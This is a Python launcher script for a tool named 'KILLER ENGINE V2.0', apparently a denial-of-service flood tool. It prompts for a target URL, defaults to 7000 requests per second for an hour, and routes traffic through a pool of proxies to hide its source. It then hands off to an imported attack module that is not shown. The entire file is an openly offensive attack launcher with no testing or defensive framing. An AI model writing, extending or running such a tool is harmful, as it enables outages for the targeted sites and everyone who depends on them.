#!/usr/bin/env python
"""
KILLER ENGINE V2.0 - EXTREME MODE (STABLE)
Quick Launch with Premium Proxies
Default: 1 hour, 7000 RPS, 1000 premium proxies

CROSS-PLATFORM: Works on Windows and Linux VPS
"""
import sys
import os
import asyncio
import platform

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.attack.auto_mode_v2 import run_auto_mode_v2, print_auto_mode_v2_summary

# Load premium proxies (cross-platform path)
PREMIUM_PROXY_FILE = os.path.join("proxies", "premium_proxy.txt")

def load_premium_proxies():
    """Load premium proxies from file (cross-platform)."""
    proxy_file = os.path.join(os.path.dirname(__file__), PREMIUM_PROXY_FILE)
    if not os.path.exists(proxy_file):
        print(f"[!] Premium proxy file not found: {proxy_file}")
        return []
    
    with open(proxy_file) as f:
        proxies = [line.strip() for line in f if line.strip()]
    
    print(f"[+] Loaded {len(proxies)} premium proxies")
    return proxies

async def main():
    print("=" * 70)
    print("  KILLER ENGINE V2.0 - EXTREME MODE (STABLE)")
    print(f"  Platform: {platform.system()} {platform.release()}")
    print("=" * 70)
    print()
    
    # Get target from user
    target = input("Target URL: ").strip()
    if not target:
        print("[!] Target required!")
        return
    
    # Default settings
    duration = 3600  # 1 hour
    rps = 7000
    
    # Ask if user wants to change defaults
    print()
    print(f"Default settings:")
    print(f"  Duration: {duration}s (1 hour)")
    print(f"  RPS: {rps}")
    print()
    
    change = input("Change defaults? (y/N): ").strip().lower()
    if change == 'y':
        try:
            duration = int(input(f"Duration (seconds) [{duration}]: ").strip() or duration)
            rps = int(input(f"Target RPS [{rps}]: ").strip() or rps)
        except ValueError:
            print("[!] Invalid input, using defaults")
    
    # Load proxies
    print()
    print("[*] Loading premium proxies...")
    proxies = load_premium_proxies()
    
    if not proxies:
        print("[!] No proxies loaded - running in RAW mode (no proxy)")
        proxy_pool = None
    else:
        # Create simple proxy pool object
        class ProxyPool:
            def __init__(self, proxies):
                self.proxies = proxies
            def get_all(self):
                return self.proxies
        proxy_pool = ProxyPool(proxies)
    
    print()
    print(f"[*] Starting attack:")
    print(f"    Target: {target}")
    print(f"    Duration: {duration}s ({duration//60} minutes)")
    print(f"    RPS: {rps}")
    print(f"    Proxies: {len(proxies) if proxies else 0}")
    print(f"    Mode: {'AMPLIFIER (with proxies)' if proxies else 'KILLER RAW (no proxy)'}")
    print()
    
    input("Press ENTER to start...")
    print()
    
    # Run attack
    result = await run_auto_mode_v2(
        target=target,
        duration=duration,
        target_rps=rps,
        config_path="config/auto_mode.json",
        proxy_pool=proxy_pool,
    )
    
    print()
    print_auto_mode_v2_summary(result)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
